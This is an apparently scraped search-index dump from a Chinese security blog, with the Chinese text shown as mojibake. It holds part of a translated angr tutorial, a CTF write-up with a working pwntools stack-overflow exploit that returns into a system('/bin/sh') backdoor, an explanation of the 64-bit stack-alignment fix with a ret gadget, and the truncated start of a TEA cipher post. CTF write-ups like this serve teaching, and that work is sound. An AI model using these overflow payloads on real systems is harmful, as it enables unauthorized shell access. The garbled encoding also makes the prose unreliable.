ä¸€ä¸ªSimStateè®°å½•ç€ä¸€ä¸ªç¨‹åºçš„å†…å­˜ã€å¯„å­˜å™¨ã€æ–‡ä»¶ä¿¡æ¯â€¦ä»»ä½•å¯ä»¥é€šè¿‡ç¨‹åºæ‰§è¡Œæ›´æ”¹çš„â€œå®æ—¶æ•°æ®â€å¥åº·éƒ½ä¼šè¢«å­˜å‚¨è¿›å»ã€‚ç¨åæˆ‘ä»¬å°†ä¼šä»‹ç»å¦‚ä½•ä¸è¿™äº›çŠ¶æ€äº¤äº’ï¼Œä½†æ˜¯ç°åœ¨ï¼Œè®©æˆ‘ä»¬ç”¨state.regså’Œstate.memæ¥æŸ¥çœ‹å½“å‰çŠ¶æ€ä¸‹çš„å¯„å­˜å™¨å’Œå†…å­˜ \u003e\u003e\u003e state.regs.rip # å–å¾—å½“å‰æŒ‡ä»¤çš„åœ°å€ \u003cBV64 0x401670\u003e \u003e\u003e\u003e state.regs.rax \u003cBV64 0x1c\u003e \u003e\u003e\u003e state.mem[proj.etry].int.resolved # å°†å…¥å£ç‚¹çš„å†…å­˜ä»¥Cè¯­è¨€ä¸­intç±»å‹æ˜¾ç¤º \u003cBV32 0x8949ed31\u003e è¿™äº›å¹¶ä¸æ˜¯pythonçš„intsï¼è¿™äº›æ˜¯bitvectorsã€‚pythonä¸­çš„integersä¸CPUå±‚é¢çš„å­—ï¼ˆwordsï¼‰å¹¶ä¸æ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œä¾‹å¦‚pythonä¸ä¼šäº§ç”Ÿæ•´æ•°æº¢å‡ºã€‚æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨bitvectorsï¼Œå¯ä»¥å°†å…¶è§†ä¸ºä¸€ä¸²bitsæ„æˆçš„æ•´æ•°ï¼Œangrä¸­ç”¨å®ƒæ¥ä»£è¡¨CPU dataã€‚æ³¨æ„æ¯ä¸ªbitvectoréƒ½æœ‰ä¸€ä¸ª.lengthå±æ€§æ¥æè¿°å®ƒæ˜¯å¤šå°‘bitså®½ æˆ‘ä»¬åœ¨åé¢å°†ä¼šå­¦ä¹ å¦‚ä½•ä½¿ç”¨å®ƒä»¬ï¼Œä½†æ˜¯ç°åœ¨ï¼Œæˆ‘ä»¬åˆ—å‡ºäº†å¦‚ä½•å°†æ•°å­—åœ¨python intå’Œbitvectorä¹‹é—´è½¬æ¢çš„æ–¹æ³• \u003e\u003e\u003e bv = state.solver.BVV(0x1234, 32) # åˆ›å»ºä¸€ä¸ª32bitå®½çš„bitvector,å®ƒçš„å€¼æ˜¯0x1234 \u003cBV32 0x1234\u003e # BVVï¼šbitvector value \u003e\u003e\u003e state.solver.eval(bv) # å°†bitvectorè½¬åŒ–ä¸ºpython int 0 ä½ å¯ä»¥æŠŠbitvectorå­˜å›å¯„å­˜å™¨å’Œå†…å­˜ï¼Œæˆ–è€…ç›´æ¥å­˜å‚¨python integerç±»å‹å€¼ï¼Œå®ƒä¼šè¢«è‡ªåŠ¨è½¬åŒ–æˆåˆé€‚å¤§å°çš„bitvector \u003e\u003e\u003e state.regs.rsi = state.solver.BVV(3, 64) \u003e\u003e\u003e state.regs.rsi \u003cBV64 0x3\u003e \u003e\u003e\u003e state.mem[0x1000].long = 4 \u003e\u003e\u003e state.mem[0x1000].long.resolved \u003cBV64 0x4\u003e memæ¥å£åˆšå¼€å§‹çœ‹ä»¤äººå›°æƒ‘ï¼Œå› ä¸ºå®ƒä½¿ç”¨äº†ä¸€äº›å¼ºå¤§çš„pythoné­”æ³•ï¼Œä¸‹é¢æ˜¯ç®€è¦çš„ä½¿ç”¨æŒ‡å—ï¼š ä½¿ç”¨array[index]æ¥æŒ‡æ˜ç¡®å®šçš„åœ°å€ ç”¨.\u003ctype\u003eæ¥æŒ‡å®šå†…å­˜æ•°æ®çš„ç±»å‹ï¼ˆå¸¸ç”¨ç±»å‹ï¼šchar, short, int, long, size_t, uint8_t, uint16_tâ€¦) é€šè¿‡memæ¥å£ä½ å¯ä»¥ï¼š å­˜å‚¨ä¸€ä¸ªå€¼åˆ°å†…å­˜ï¼Œæ—¢å¯ä»¥æ˜¯bitvector,ä¹Ÿå¯ä»¥æ˜¯python int ç”¨.resolveæ¥è·å–å†…å­˜å€¼å¹¶è½¬åŒ–ä¸ºbitvector ç”¨.concreteæ¥è·å–å†…å­˜å€¼å¹¶è½¬åŒ–ä¸ºpython int è¿˜æœ‰æ›´å¤šé«˜çº§ç”¨æ³•å°†åœ¨åé¢æåˆ° æœ€ç»ˆï¼Œå¦‚æœä½ å°è¯•è¯»å–æ›´å¤šå¯„å­˜å™¨çš„å€¼ï¼Œä½ å¯èƒ½ä¼šé‡åˆ°ä¸€ä¸ªé•¿å¾—ååˆ†å¥‡æ€ªçš„å€¼ \u003e\u003e\u003e state.regs.rdi \u003cBV64 reg_48_11_64{UNINITIALIZED}\u003e è¿™åŒæ ·æ˜¯ä¸€ä¸ª64ä½bitvectorï¼Œä½†æ˜¯å®ƒå¹¶æ²¡æœ‰æºå¸¦æ•°å€¼ï¼Œç›¸åçš„ï¼Œå®ƒæœ‰ä¸€ä¸ªåå­—ï¼å®ƒè¢«ç§°ä¸ºç¬¦å·å˜é‡ï¼Œä¹Ÿæ˜¯ç¬¦å·æ‰§è¡Œçš„åŸºç¡€ã€‚ä¸è¦ææ…Œï¼æˆ‘ä»¬ä¼šåœ¨ä¸¤ç« ä¹‹åè®¨è®ºå®ƒçš„ç»†èŠ‚ æ¨¡æ‹Ÿç®¡ç†å™¨ï¼ˆSimulation Managersï¼‰ å¦‚æœç¨‹åºåœ¨ä»»æ„ç»™å®šçš„æ—¶é—´ç‚¹éƒ½æœ‰ä¸€ä¸ªçŠ¶æ€ï¼Œé‚£ä¹ˆå¿…ç„¶æœ‰ä¸€ç§æ–¹æ³•å¯ä»¥è®©å®ƒå˜æˆä¸‹ä¸€ç§çŠ¶æ€ã€‚simulation manageræ˜¯angræ‰§è¡Œä¸­çš„ä¸»è¦æ¥å£ã€‚æ¨¡æ‹Ÿï¼ˆsimulationï¼‰æ— è®ºä½ å¦‚ä½•å«å®ƒï¼Œå®ƒéƒ½æ˜¯å¸¦æœ‰çŠ¶æ€çš„ã€‚ä½œä¸ºä¸€ä¸ªç®€çŸ­çš„ä»‹ç»ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•åœ¨æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„ä»£ç å—ä¸­æ ‡è®°çŠ¶æ€ã€‚ é¦–å…ˆï¼Œæˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªsimulation managerï¼Œæ„é€ å‡½æ•°å¯ä»¥ä¼ å…¥ä¸€ä¸ªçŠ¶æ€æˆ–çŠ¶æ€åˆ—è¡¨ \u003e\u003e\u003e simgr = proj.factory.simulation_manager(state) \u003cSimulationManager with 1 active\u003e \u003e\u003e\u003e simgr.active [\u003cSimState @ 0x401670\u003e] ä¸€ä¸ªsimulation managerå¯ä»¥æœ‰å¤šç§çŠ¶æ€çš„å°è£…ï¼ˆstashï¼‰ï¼Œé»˜è®¤çš„stashæ˜¯activeï¼Œç”¨æˆ‘ä»¬ä¼ å…¥çš„çŠ¶æ€åˆå§‹åŒ–ã€‚å¦‚æœè¿˜ä¸å¤Ÿçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹simgr.active[0]æ¥è¿›ä¸€æ­¥äº†è§£å„ç§çŠ¶æ€ ç°åœ¨ï¼Œ å‡†å¤‡å¥½ï¼Œæˆ‘ä»¬è¦è¿›è¡Œä¸€äº›ç¨‹åºçš„æ‰§è¡Œäº†ã€‚ \u003e\u003e\u003e simgr.step() æˆ‘ä»¬åˆšåˆšè¿›è¡Œäº†ä¸€ä¸ªåŸºæœ¬å¿«çš„ç¬¦å·æ‰§è¡Œï¼ æˆ‘ä»¬å¯ä»¥å†çœ‹çœ‹active stashï¼Œæ³¨æ„å®ƒå·²ç»è¢«æ›´æ–°äº†ï¼Œå¹¶ä¸”å®ƒå¹¶æ²¡æœ‰æ”¹å˜æˆ‘ä»¬åŸæ¥çš„çŠ¶æ€ã€‚SimStateå¯¹è±¡åœ¨æ‰§è¡Œæ—¶è¢«è§†ä¸ºä¸å¯å˜ï¼Œæ‰€ä»¥ä½ å¯ä»¥å®‰å…¨åœ°å°†å•ä¸ªçŠ¶æ€ä½œä¸ºå¤šè½®æ‰§è¡Œçš„å¼€å§‹ï¼ˆbaseï¼‰ \u003e\u003e\u003e simgr.active [\u003cSimState @ 0x1020300\u003e] \u003e\u003e\u003e simgr.active[0].regs.rip # new and exciting! \u003cBV64 0x1020300\u003e \u003e\u003e\u003e state.regs.rip # still the same! \u003cBV64 0x401670\u003e /bin/trueä¸æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­æ¥æè¿°å¦‚ä½•ç”¨ç¬¦å·æ‰§è¡Œåšæœ‰è¶£çš„äº‹ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨å°±åˆ°æ­¤ä¸ºæ­¢ ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:3","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäºŒï¼‰Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"åˆ†æï¼ˆAnalyseï¼‰ angré¢„å…ˆæ‰“åŒ…äº†ä¸€äº›å†…ç½®åˆ†ææ–¹æ³•ï¼Œä½ å¯ä»¥åˆ©ç”¨å®ƒä»¬ä»ç¨‹åºä¸­æå–ä¸€äº›æœ‰è¶£çš„ä¿¡æ¯ã€‚ \u003e\u003e\u003e proj.analyses. # åœ¨è¿™é‡ŒæŒ‰tabæ¥åˆ—å‡ºæ‰€æœ‰å†…ç½®çš„åˆ†ææ–¹æ³• proj.analyses.BackwardSlice proj.analyses.CongruencyCheck proj.analyses.reload_analyses proj.analyses.BinaryOptimizer proj.analyses.DDG proj.analyses.StaticHooker proj.analyses.BinDiff proj.analyses.DFG proj.analyses.VariableRecovery proj.analyses.BoyScout proj.analyses.Disassembly proj.analyses.VariableRecoveryFast proj.analyses.CDG proj.analyses.GirlScout proj.analyses.Veritesting proj.analyses.CFG proj.analyses.Identifier proj.analyses.VFG proj.analyses.CFGEmulated proj.analyses.LoopFinder proj.analyses.VSA_DDG proj.analyses.CFGFast proj.analyses.Reassembler æœ¬æ‰‹å†Œåé¢ä¼šè®°å½•å…¶ä¸­çš„ä¸€äº›æ–¹æ³•ï¼Œä½†æ€»çš„æ¥è¯´ï¼Œå¦‚æœä½ æƒ³è¦æ‰¾åˆ°å¦‚ä½•ä½¿ç”¨å†…ç½®çš„åˆ†ææ–¹æ³•ï¼Œä½ åº”è¯¥æŸ¥çœ‹apiæ–‡æ¡£ã€‚ä½œä¸ºä¸€ä¸ªç®€çŸ­çš„ä¾‹å­ï¼šä¸‹é¢è¯´æ˜äº†ä½ åº”è¯¥æ€æ ·ç”Ÿæˆå¹¶ä½¿ç”¨ä¸€ä¸ªå¿«é€Ÿçš„ç¨‹åºæ§åˆ¶æµå›¾ï¼š # åˆšå¼€å§‹æ—¶ï¼Œå½“æˆ‘ä»¬åŠ è½½äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œå®ƒè¿˜å°†å…¶æ‰€æœ‰ä¾èµ–é¡¹åŠ è½½åˆ°åŒä¸€å—è™šæ‹Ÿå†…å­˜ä¸­ # è¿™å¯¹äºå¤§å¤šæ•°åˆ†ææ˜¯ä¸æ„¿æ„çœ‹åˆ°çš„ \u003e\u003e\u003e proj = angr.Project('/bin/true', auto_load_libs=False) \u003e\u003e\u003e cfg = proj.analyses.CFGFast() \u003cCFGFast Analysis Result at 0x2d85130\u003e # cfg.graph æ˜¯ä¸€ä¸ªå……æ»¡äº†CFGNodeå®ä¾‹çš„ networkx DiGraph # ä½ åº”è¯¥å»çœ‹ networkx APIs çš„æ–‡æ¡£å»å­¦ä¹ å¦‚ä½•ä½¿ç”¨å®ƒ \u003e\u003e\u003e cfg.graph \u003cnetworkx.classes.digraph.DiGraph at 0x2da43a0\u003e \u003e\u003e\u003e len(cfg.graph.nodes()) 951 # å»è·å–æŒ‡å®šåœ°å€çš„ CFGNodeï¼Œ å¯ä»¥ç”¨ cfg.get_any_node \u003e\u003e\u003e entry_node = cfg.get_any_node(proj.entry) \u003e\u003e\u003e len(list(cfg.graph.successors(entry_node))) 2 ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:4","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäºŒï¼‰Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Angr"],"content":"Now whatï¼Ÿ é˜…è¯»å®Œè¿™ä¸€é¡µä¹‹åï¼Œä½ åº”è¯¥ç†Ÿæ‚‰äº†angrå‡ ä¸ªé‡è¦æ¦‚å¿µï¼šbasic blocks, states, bitvectors, simulation managers å’Œanalysesã€‚ä½†æ˜¯é™¤äº†æŠŠangrä½œä¸ºç¾åŒ–çš„è°ƒè¯•å™¨ä»¥å¤–ï¼Œä½ è¿˜ä¸èƒ½åšä»»ä½•äº‹æƒ…ã€‚ç»§ç»­é˜…è¯»ï¼Œä½ å°†è§£é”æ›´æ·±å±‚æ¬¡çš„åŠ›é‡â€¦ ","date":"2022-09-05","objectID":"/2022/09/top_level_interface/:2:5","tags":["reverse","angr"],"title":"angræ–‡æ¡£ç¿»è¯‘ï¼ˆäºŒï¼‰Top Level Interface","uri":"/2022/09/top_level_interface/"},{"categories":["Binary"],"content":"èµ· ä»¥ä¸€é“ç®€å•çš„pwné¢˜è¯´æ˜ï¼Œé¢˜ç›®å‚è§BUU-rip æŸ¥çœ‹ä¿æŠ¤ä¿¡æ¯ï¼Œå•¥éƒ½æ²¡å¼€ï¼Œamd64 â¯ checksec ./pwn1 [*] '/home/dx3906/CTF/problem/pwn/buu/rip/pwn1' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments è¿è¡Œ â¯ ./pwn1 please input abc abc ok,bye!!! æ‹–å…¥ida // main int __cdecl main(int argc, const char **argv, const char **envp) { char s[15]; // [rsp+1h] [rbp-Fh] BYREF puts(\"please input\"); gets((__int64)s, (__int64)argv); puts(s); puts(\"ok,bye!!!\"); return 0; } // backdoor int fun() { return system(\"/bin/sh\"); } // fun æ±‡ç¼– .text:0000000000401186 fun proc near .text:0000000000401186 ; __unwind { .text:0000000000401186 push rbp .text:0000000000401187 mov rbp, rsp .text:000000000040118A lea rdi, command ; \"/bin/sh\" .text:0000000000401191 call _system ; Call Procedure .text:0000000000401196 nop ; No Operation .text:0000000000401197 pop rbp .text:0000000000401198 retn ; Return Near from Procedure .text:0000000000401198 ; } // starts at 401186 .text:0000000000401198 fun endp æ‰€ä»¥è§£é¢˜æ€è·¯å°±æ˜¯é€šè¿‡mainçš„getså‡½æ•°è¿›è¡Œæ ˆæº¢å‡ºï¼Œè¦†ç›–è¿”å›åœ°å€ï¼Œè·³è½¬åˆ°funæ‰§è¡Œå¾—åˆ°shell ç”±æ­¤å¾—åˆ°exp from pwn import * context(log_level=\"debug\", arch=\"amd64\", os=\"linux\") p = process(\"./pwn1\") payload = b'a'*23 + p64(0x401186) p.sendlineafter(b\"please input\\n\",payload) p.interactive() ä½†æ˜¯get shellå¤±è´¥ ","date":"2022-09-04","objectID":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/:1:0","tags":["pwn"],"title":"å †æ ˆå¯¹é½â€”â€”å…³äº64ä½ç¨‹åºret2textå¤±è´¥çš„æº¯æº","uri":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"},{"categories":["Binary"],"content":"æ‰¿ äºæ˜¯å»ç™¾åº¦äº†ä¸€ä¸‹ï¼Œå‘ç°å„ç§wpçš„payloadä¸­é—´å¤šå¡äº†ä¸€ä¸ªåœ°å€0x401198ï¼Œå³payload = b'a'*23 + p64(0x401198) + p64(0x401186)ï¼Œè¯•äº†ä¸€ä¸‹ç¡®å®å¯è¡Œ æ–‡ç« åŸå› è¯´æ˜¯ä¸ºäº†æ¢å¤å †æ ˆå¹³è¡¡ï¼Œä»€ä¹ˆæ˜¯å †æ ˆå¹³è¡¡å‘¢ï¼Ÿ æˆ‘ç†è§£çš„æ˜¯ï¼šåœ¨å‡½æ•°è°ƒç”¨ç»“æŸä¹‹åï¼Œå°†å †æ ˆæ¢å¤åˆ°è°ƒç”¨ä¹‹å‰çš„æ ·å­ï¼Œä»æ±‡ç¼–å±‚é¢æ¥è¯´å°±æ˜¯å¤åŸespä¸ebp ä½†payloadé‡ŒåŠ äº†0x401198è¿™ä¸ªåœ°å€åªæ˜¯å¤šæ‰§è¡Œäº†ä¸€æ¡retnï¼Œæœ€å¤šä¹Ÿåªæ˜¯è®©esp+4ä¹‹ç±»çš„ï¼Œè¿™å°±èƒ½æ§åˆ¶å †æ ˆå¹³è¡¡äº†ï¼Ÿæˆ‘ç™¾æ€ä¸å¾—å…¶è§£ ","date":"2022-09-04","objectID":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/:2:0","tags":["pwn"],"title":"å †æ ˆå¯¹é½â€”â€”å…³äº64ä½ç¨‹åºret2textå¤±è´¥çš„æº¯æº","uri":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"},{"categories":["Binary"],"content":"è½¬ æ‹¿gdb attachä¸Šå»è°ƒå‘ç°äº†é—®é¢˜ï¼Œè·³è½¬funè°ƒç”¨systemå‡½æ•°æ—¶åŒ…æ‹¬ä¼ å‚éƒ½æ˜¯æ­£å¸¸çš„ï¼Œä½†ä¼šæ–­åœ¨è¿™ä¸€è¡Œæ±‡ç¼–ä¸Š 0x7fad5eadef43 movaps xmmword ptr [rsp + 0x50], xmm0 ; æŠ¥é”™ ; Program received signal SIGSEGV, Segmentation fault. åœ¨æ‰§è¡Œglibcä¸­çš„systemç³»ç»Ÿè°ƒç”¨æ—¶ï¼Œå¾ˆå¯èƒ½ä¼šç”¨åˆ°movapsæŒ‡ä»¤ movapsï¼šåœ¨ä¸¤ä¸ªXMMå¯„å­˜å™¨æˆ–XMMå¯„å­˜å™¨ä¸å†…å­˜ä¹‹é—´ç§»åŠ¨å››ä¸ªå•ç²¾åº¦æµ®ç‚¹å€¼ã€‚è¦æ±‚å¦‚æœæ¶‰åŠå†…å­˜ï¼Œåˆ™å†…å­˜åœ°å€å¿…é¡»æŒ‰16å­—èŠ‚å¯¹é½ï¼Œå³16è¿›åˆ¶è¡¨ç¤ºçš„åœ°å€æœ€åä¸€ä½å¿…é¡»æ˜¯0 æ­¤å¤„å¯æ‰“å°rsp+0x50å‘ç°ç¡®å®ä¸ç¬¦åˆè¦æ±‚ pwndbg\u003e p $rsp+0x50 $1 = (void *) 0x7fffd26e4508 éœ€è¦rsp+0x50æŒ‰16å­—èŠ‚å¯¹é½ï¼Œæ›´è¿›ä¸€æ­¥æ¥è¯´ï¼Œå°±æ˜¯è¦rspå¯„å­˜å™¨æŒ‡å‘çš„åœ°å€æŒ‰16å­—èŠ‚å¯¹é½ï¼Œè€Œèƒ½å¤Ÿä½¿rspå¯„å­˜å™¨å˜åŒ–çš„æ— écallã€retnã€pushã€popè¿™äº›æŒ‡ä»¤ã€‚ å®é™…ä¸Šï¼Œç¨‹åºåœ¨æ­£å¸¸è¿è¡Œæƒ…å†µä¸‹ï¼Œç¼–è¯‘å™¨èƒ½ä¿è¯ç¼–è¯‘å‡ºæ¥çš„è¿™äº›æŒ‡ä»¤æœ‰åºè¿ä½œï¼Œå½“éœ€è¦è¿›è¡Œsystemè°ƒç”¨æ—¶ï¼Œä¸€å®šæ˜¯16å­—èŠ‚å¯¹é½ï¼Œä½¿ç”¨movapsæŒ‡ä»¤ä¸ä¼šäº§ç”Ÿé”™è¯¯ åªæœ‰ç¨‹åºå †æ ˆè¢«éæ­£å¸¸åœ°ä¿®æ”¹ï¼Œç¨‹åºè¿›è¡Œéé¢„æœŸè¡Œä¸ºæ—¶ï¼Œæ‰å¯èƒ½ä¼šå‡ºç°æ— æ³•å¯¹é½çš„æƒ…å†µï¼Œä»è€Œå¼•å‘Segmentation faultï¼Œä½¿ç¨‹åºå¼‚å¸¸é€€å‡º å†æ·±å…¥å»æƒ³ï¼Œç”±äºæ˜¯64ä½ç¨‹åºï¼Œæ‰€ä»¥rspæ¯æ¬¡çš„å˜åŒ–è¦ä¹ˆæ˜¯rsp-=8,è¦ä¹ˆæ˜¯rsp+=8ï¼Œæ•…rspæ‰€æŒ‡åœ°å€æœ€åä¸€ä½å…¶å®åªæœ‰ä¸¤ä¸ªå–å€¼ï¼Œ0æˆ–8ï¼Œä¸º0æ—¶å †æ ˆå¯¹é½ï¼Œä¸º8æ—¶ä¼šå¼•å‘é”™è¯¯ åœ¨è¿›è¡Œret2textæ—¶ï¼Œæˆ‘ä»¬è¦†ç›–äº†å‡½æ•°è¿”å›åœ°å€ï¼Œç¨‹åºæœ¬è¯¥è¿”å›è‡³è°ƒç”¨å¤„ï¼Œå´è¿›å…¥äº†ä¸€ä¸ªæ–°çš„å‡½æ•°ã€‚ åœ¨æ­¤ä¹‹å‰ï¼ŒrspæŒ‡å‘çš„åœ°å€ä¸€ç›´æ˜¯æ­£å¸¸çš„ï¼Œä¸ç¨‹åºæ­£å¸¸æ‰§è¡Œæ— å¼‚çš„ï¼Œä½†æ–°å‡½æ•°ç¬¬ä¸€å¥è¦æ‰§è¡Œå‹æ ˆå‘½ä»¤push rbpï¼Œæ­¤æ—¶rsp-=8ï¼Œäºæ˜¯rspæœ€åä¸€ä½å˜æˆäº†8ï¼Œè¿›è¡Œsystemè°ƒç”¨æ—¶å‘ç”Ÿé”™è¯¯ é‚£ä¹ˆå¦‚ä½•é¿å…é”™è¯¯å‘¢ï¼Ÿ æ˜¾è€Œæ˜“è§çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¿®æ”¹rspå¯„å­˜å™¨çš„å€¼ï¼Œæ— è®ºæ˜¯åŠ 8è¿˜æ˜¯å‡8ï¼Œä½†åŒæ—¶å¿…é¡»åˆç†åˆ©ç”¨è¿”å›åœ°å€æ‰èƒ½è¿›è¡Œè·³è½¬ã€‚äºæ˜¯ï¼Œretnæˆä¸ºäº†ä¸€ä¸ªå¾ˆå¥½çš„é€‰æ‹©ï¼Œæˆ‘ä»¬å¯ä»¥æå‰å¸ƒæ ˆï¼Œå…ˆå‹å…¥ä¸€ä¸ªretnæŒ‡ä»¤çš„åœ°å€ï¼Œå†å‹å…¥åé—¨å‡½æ•°çš„åœ°å€ ç¨‹åºé¦–å…ˆæ‰§è¡ŒretnæŒ‡ä»¤å³pop ripä½¿rsp+8ï¼Œæ­¤æ—¶ç´§éšå…¶ååé—¨å‡½æ•°çš„åœ°å€èµ‹å€¼ç»™ripï¼Œä¸‹ä¸€æ­¥è¿›å…¥åé—¨å‡½æ•°ï¼Œå½“æ‰§è¡Œpush rbpæ—¶rsp-8ï¼Œæ­¤æ—¶rspæœ€åä¸€ä½å˜å›0ï¼Œç¨‹åºæ­£å¸¸æ‰§è¡Œ æ¢ä¸€ç§æ€è·¯ï¼Ÿ æ—¢ç„¶æˆ‘ä»¬çŸ¥é“äº†æ˜¯å¤šäº†ä¸€å¥push rbpå‡ºäº†é—®é¢˜ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥è·³è¿‡è¿™ä¸€å¥å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠè¿”å›åœ°å€æ”¹ä¸ºsystemè°ƒç”¨ä¹‹å‰ä¼ å‚çš„åœ°å€ï¼Œå³payload = b'a'*23 + p64(0x40118A)ï¼Œä¸€æ ·å¯ä»¥get shell ","date":"2022-09-04","objectID":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/:3:0","tags":["pwn"],"title":"å †æ ˆå¯¹é½â€”â€”å…³äº64ä½ç¨‹åºret2textå¤±è´¥çš„æº¯æº","uri":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"},{"categories":["Binary"],"content":"åˆ 64ä½ç¨‹åºret2textå¤±è´¥ç®€å•ä»¥æ²¡æœ‰å¹³è¡¡å †æ ˆæ¥è§£é‡Šæ˜¯æä¸è´Ÿè´£çš„åšæ³• å¹³è¡¡å †æ ˆæ˜¯æŒ‡åœ¨å‡½æ•°è°ƒç”¨ç»“æŸåï¼Œå°†å †æ ˆæ¢å¤åˆ°åŸæ¥çš„çŠ¶æ€ã€‚ ä½†æˆ‘ä»¬åœ¨åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´è¿›è¡Œæ”»å‡»æ—¶ï¼Œå¹¶ä¸å…³å¿ƒå‡½æ•°è°ƒç”¨ç»“æŸåçš„çŠ¶æ€ã€‚åªæ˜¯éœ€è¦åœ¨ç³»ç»Ÿè°ƒç”¨ä¹‹å‰ä¿è¯å †æ ˆå¯¹é½å³å¯ ","date":"2022-09-04","objectID":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/:4:0","tags":["pwn"],"title":"å †æ ˆå¯¹é½â€”â€”å…³äº64ä½ç¨‹åºret2textå¤±è´¥çš„æº¯æº","uri":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"},{"categories":["Binary"],"content":"Ref https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call https://research.csiro.au/tsblog/debugging-stories-stack-alignment-matters/ https://ropemporium.com/guide.html ä»¥ä¸Šï¼Œå¦‚æœ‰ç–æ¼è¯·å¸ˆå‚…ä»¬æŒ‡å‡º ","date":"2022-09-04","objectID":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/:5:0","tags":["pwn"],"title":"å †æ ˆå¯¹é½â€”â€”å…³äº64ä½ç¨‹åºret2textå¤±è´¥çš„æº¯æº","uri":"/2022/09/%E5%A0%86%E6%A0%88%E5%AF%B9%E9%BD%90%E5%85%B3%E4%BA%8E64%E4%BD%8D%E7%A8%8B%E5%BA%8Fret2text%E5%A4%B1%E8%B4%A5%E7%9A%84%E6%BA%AF%E6%BA%90/"},{"categories":["Crypto"],"content":"TEA ","date":"2022-07-29","objectID":"/2022/07/tea/:0:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆäºŒï¼‰TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"ç®—æ³•ç®€ä»‹ TEAï¼šå¾®å‹åŠ å¯†ç®—æ³•ï¼ˆTiny Encryption Algorithmï¼ŒTEAï¼‰æ˜¯ä¸€ç§æ˜“äºæè¿°å’Œæ‰§è¡Œçš„å—å¯†ç ï¼Œé€šå¸¸åªéœ€è¦å¾ˆå°‘çš„ä»£ç å°±å¯å®ç°ã€‚ å—å¯†ç ï¼šåœ¨å¯†ç å­¦ä¸­ï¼Œåˆ†ç»„åŠ å¯†ï¼ˆè‹±è¯­ï¼šBlock cipherï¼‰ï¼Œåˆç§°åˆ†å—åŠ å¯†æˆ–å—å¯†ç ï¼Œæ˜¯ä¸€ç§å¯¹ç§°å¯†é’¥ç®—æ³•ã€‚å®ƒå°†æ˜æ–‡åˆ†æˆå¤šä¸ªç­‰é•¿çš„æ¨¡å—ï¼ˆblockï¼‰ï¼Œä½¿ç”¨ç¡®å®šçš„ç®—æ³•å’Œå¯¹ç§°å¯†é’¥å¯¹æ¯ç»„åˆ†åˆ«åŠ å¯†è§£å¯†ã€‚ ","date":"2022-07-29","objectID":"/2022/07/tea/:1:0","tags":["crypto"],"title":"é€†å‘äººå­¦å¯†ç ï¼ˆäºŒï¼‰TEA","uri":"/2022/07/tea/"},{"categories":["Crypto"],"content":"ç®—æ³•å±æ€§ TEAæ“ä½œå¤„ç†ä¸¤ä¸ª32ä½æ— 